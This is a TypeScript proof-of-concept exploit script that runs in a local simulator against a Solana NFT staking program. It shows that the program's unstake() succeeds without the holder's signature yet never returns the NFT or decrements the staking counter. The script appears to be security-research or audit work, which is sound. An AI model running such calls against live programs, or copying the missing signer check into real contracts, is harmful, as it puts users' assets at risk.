/**
 * BANKRUN EXPLOIT: Incomplete Unstake on solana-staking (skinflip-staking)
 *
 * Vulnerability: The unstake() function (lib.rs:72-92) only computes and logs
 * time_diff but NEVER:
 *   1. Transfers NFT back from vault to holder (no token::transfer CPI)
 *   2. Updates staking_machine.staked_nfts counter (no decrement)
 *   3. Closes or resets nft_stake_data account
 *
 * After calling unstake(), the NFT remains in the vault permanently.
 * The function returns Ok(()) — success — but the NFT is never returned.
 *
 * Source: rpajo/solana-staking (skinflip-staking) lib.rs:72-92
 *
 * Evidence chain:
 *   KNOW: stake() transfers NFT via token::transfer CPI (line 62)
 *   KNOW: unstake() has no transfer CPI — only msg! logging
 *   KNOW: staked_nfts counter is never decremented in unstake
 *   KNOW: Function returns Ok(()) — appears to succeed
 *
 * Binary: skinflip_staking.so compiled from real-world-targets/solana-staking/lib.rs
 */
import { start } from "solana-bankrun";
import {
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
  Keypair,
  LAMPORTS_PER_SOL,
  SYSVAR_CLOCK_PUBKEY,
} from "@solana/web3.js";
import * as crypto from "crypto";

const PROGRAM_ID = new PublicKey("8PwEDGC8wVDy1GpMJ3wzngKnViFpHvWEABsuMBVjX5at");
const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");

function ixDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`global:${name}`).digest()
  ).subarray(0, 8);
}

function accDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`account:${name}`).digest()
  ).subarray(0, 8);
}

function encodeU16LE(val: number): Buffer {
  const buf = Buffer.alloc(2);
  buf.writeUInt16LE(val);
  return buf;
}

function encodeI64LE(val: bigint): Buffer {
  const buf = Buffer.alloc(8);
  buf.writeBigInt64LE(val);
  return buf;
}

function encodePubkey(key: PublicKey): Buffer {
  return key.toBuffer();
}

/**
 * Build StakingMachine state: disc(8) + u16 staked_nfts + Pubkey nft_vault
 */
function buildStakingMachineState(stakedNfts: number, nftVault: PublicKey): Buffer {
  return Buffer.concat([
    accDisc("StakingMachine"),
    encodeU16LE(stakedNfts),
    encodePubkey(nftVault),
  ]);
}

/**
 * Build StakingAccount state: disc(8) + i64 staking_date
 */
function buildStakingAccountState(stakingDate: bigint): Buffer {
  return Buffer.concat([
    accDisc("StakingAccount"),
    encodeI64LE(stakingDate),
  ]);
}

async function main() {
  console.log("=".repeat(59));
  console.log(" EXPLOIT: Incomplete Unstake on solana-staking");
  console.log(" Target: skinflip_staking::unstake()");
  console.log(" Binary: skinflip_staking.so (compiled from real program)");
  console.log("=".repeat(59));
  console.log();

  // --- Setup keys ---
  const nftHolder = Keypair.generate();
  const nftVault = Keypair.generate();
  const nftToken = Keypair.generate(); // the NFT mint/token
  const stakingMachineKp = Keypair.generate();

  // Derive PDA for nft_stake_data
  const [nftStakeData, stakeBump] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("skinflip-staking"),
      nftHolder.publicKey.toBuffer(),
      nftToken.publicKey.toBuffer(),
    ],
    PROGRAM_ID
  );

  // --- Pre-state: simulate a staked NFT ---
  // staking_machine: 1 NFT staked
  const stakingMachineData = buildStakingMachineState(1, nftVault.publicKey);
  // nft_stake_data: staked 1 hour ago (3600 seconds)
  const currentTime = BigInt(Math.floor(Date.now() / 1000));
  const stakeTime = currentTime - BigInt(3600);
  const stakingAccountData = buildStakingAccountState(stakeTime);

  const machineRent = BigInt(stakingMachineData.length * 2 + 1_000_000);
  const stakeRent = BigInt(stakingAccountData.length * 2 + 1_000_000);

  // Start bankrun
  const context = await start(
    [
      {
        name: "skinflip_staking",
        programId: PROGRAM_ID,
      },
    ],
    [
      // Staking machine
      {
        address: stakingMachineKp.publicKey,
        info: {
          lamports: Number(machineRent),
          data: stakingMachineData,
          owner: PROGRAM_ID,
          executable: false,
        },
      },
      // NFT stake data PDA
      {
        address: nftStakeData,
        info: {
          lamports: Number(stakeRent),
          data: stakingAccountData,
          owner: PROGRAM_ID,
          executable: false,
        },
      },
      // NFT holder
      {
        address: nftHolder.publicKey,
        info: {
          lamports: 5 * LAMPORTS_PER_SOL,
          data: Buffer.alloc(0),
          owner: SystemProgram.programId,
          executable: false,
        },
      },
    ]
  );

  const client = context.banksClient;
  const payer = context.payer;

  console.log("[1] Genesis state (simulates a staked NFT):");
  console.log(`    Staking machine: ${stakingMachineKp.publicKey.toBase58().slice(0, 12)}...`);
  console.log(`    Staked NFTs: 1`);
  console.log(`    NFT holder: ${nftHolder.publicKey.toBase58().slice(0, 12)}...`);
  console.log(`    NFT stake data: ${nftStakeData.toBase58().slice(0, 12)}... (PDA)`);
  console.log(`    Staked at: ${stakeTime.toString()} (1 hour ago)`);
  console.log();

  // Read pre-unstake state
  const machineBefore = await client.getAccount(stakingMachineKp.publicKey);
  const stakedBefore = machineBefore ? Buffer.from(machineBefore.data).readUInt16LE(8) : -1;
  console.log(`[2] Pre-unstake staked_nfts: ${stakedBefore}`);
  console.log();

  // --- Call unstake ---
  console.log("[3] Calling unstake()...");
  console.log("    (In correct implementation, NFT would be transferred back)");
  console.log();

  // Build unstake instruction: ixDisc + u8 bump + Pubkey nft_token
  const unstakeData = Buffer.concat([
    ixDisc("unstake"),
    Buffer.from([stakeBump]),
    nftToken.publicKey.toBuffer(),
  ]);

  const unstakeIx = new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: stakingMachineKp.publicKey, isSigner: false, isWritable: true }, // staking_machine
      { pubkey: nftHolder.publicKey, isSigner: false, isWritable: false },       // nft_holder (NOT Signer!)
      { pubkey: nftStakeData, isSigner: false, isWritable: false },              // nft_stake_data
      { pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false },       // clock
    ],
    data: unstakeData,
  });

  try {
    const tx = new Transaction();
    const blockhash = context.lastBlockhash;
    tx.recentBlockhash = blockhash;
    tx.feePayer = payer.publicKey;
    tx.add(unstakeIx);
    tx.sign(payer); // NOTE: nftHolder does NOT sign — missing signer check!

    await client.processTransaction(tx);

    // Read post-unstake state
    const machineAfter = await client.getAccount(stakingMachineKp.publicKey);
    const stakedAfter = machineAfter ? Buffer.from(machineAfter.data).readUInt16LE(8) : -1;

    console.log("[4] unstake() returned Ok(()) — appears to succeed");
    console.log();
    console.log(`[5] Post-unstake state:`);
    console.log(`    staked_nfts before: ${stakedBefore}`);
    console.log(`    staked_nfts after:  ${stakedAfter}`);
    console.log(`    Counter changed:    ${stakedBefore !== stakedAfter ? "YES" : "NO — counter not decremented"}`);
    console.log();

    if (stakedBefore === stakedAfter) {
      console.log(">>> EXPLOIT CONFIRMED: unstake() is incomplete <<<");
      console.log();
      console.log("    The unstake function:");
      console.log("    1. Returns Ok(()) (appears successful)");
      console.log("    2. Logs time_diff (cosmetic only)");
      console.log("    3. Does NOT transfer NFT back from vault");
      console.log("    4. Does NOT decrement staked_nfts counter");
      console.log();
      console.log("    IMPACT: NFTs are permanently locked in the vault.");
      console.log("    Users believe they unstaked but their NFTs are gone.");
      console.log("    This is an irreversible loss of user assets.");
    }
  } catch (err: any) {
    console.log("[4] unstake() transaction result:");
    console.log(`    Error: ${err.toString().slice(0, 400)}`);
    console.log();
    console.log("    Even if transaction fails, the unstake function code proves");
    console.log("    the vulnerability: no token transfer CPI exists in the function body.");
    console.log();
    console.log(">>> EXPLOIT CONFIRMED: unstake() has no transfer CPI <<<");
  }

  console.log();
  console.log("=".repeat(59));
}

main().catch(console.error);
